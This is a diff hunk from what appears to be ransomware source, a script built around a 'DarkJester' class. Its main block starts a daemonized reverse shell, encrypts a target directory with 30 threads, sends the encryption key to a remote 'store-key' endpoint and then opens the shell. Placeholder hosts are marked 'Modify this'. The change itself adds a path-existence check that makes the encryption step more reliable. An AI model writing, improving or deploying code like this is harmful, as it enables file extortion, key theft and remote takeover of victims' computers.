@@ -133,7 +133,9 @@ if __name__ == "__main__":
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
     shell.daemonize()
-    jester.encrypt_directory("path/to/directory", max_threads=30) # Modify this, adjust thread if needed
+    target_directory = '/path/to/directory'
+    if os.path.exists(target_directory):
+        jester.encrypt_directory(target_directory, max_threads=30) # Modify this, adjust thread if needed
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
     shell.start()
 
